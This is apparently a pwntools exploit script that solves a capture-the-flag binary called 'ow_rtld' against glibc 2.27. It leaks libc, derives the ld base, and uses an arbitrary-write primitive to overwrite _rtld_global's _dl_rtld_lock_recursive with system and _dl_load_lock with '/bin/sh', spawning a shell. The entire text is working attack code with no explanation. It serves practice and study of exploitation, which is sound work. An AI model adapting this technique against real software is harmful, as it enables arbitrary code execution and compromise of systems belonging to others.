from pwn import *
context.log_level="debug"
p = process("./ow_rtld")
# p = remote("host1.dreamhack.games", 10199)
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

#Calc libc_base
p.recvuntil(b"stdout: ")
stdout = int(p.recvuntil(b"\n"), 16)
print("stdout: ", hex(stdout))
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
print("Libc base: ", hex(libc_base))

#Calc ld_base
ld_base = libc_base + 0x3f1000
print("ld base: ", hex(ld_base))

#Calc _dl_load_lock, _dl_rtld_lock_recursive
_rtld_global = ld_base + ld.symbols["_rtld_global"]
_dl_load_lock = _rtld_global + 2312
_dl_rtld_lock_recursive = _rtld_global + 3840
print("_rtld_global: ", hex(_rtld_global))
print("_dl_load_lock: ", hex(_dl_load_lock))
print("_dl_rtld_lock_recursive: ", hex(_dl_rtld_lock_recursive))

#Overwrite _dl_rtld_lock_recursive , _dl_load_lock
system = libc_base + libc.symbols["system"]
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"addr: ", str(_dl_rtld_lock_recursive).encode())
p.sendlineafter(b"data: ", str(system).encode())

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"addr: ", str(_dl_load_lock).encode())
p.sendlineafter(b"data: ", str(u64("/bin/sh\x00")).encode())

p.sendlineafter(b"> ", b"3")

p.interactive()

# pwndbg> p &_rtld_global._dl_load_lock
# $1 = (__rtld_lock_recursive_t *) 0x228968 <_rtld_local+2312>
# pwndbg> p &_rtld_global._dl_rtld_lock_recursive
# $2 = (void (**)(void *)) 0x228f60 <_rtld_local+3840>
# pwndbg> p &_rtld_global
# $3 = (struct rtld_global *) 0x228060 <_rtld_local>
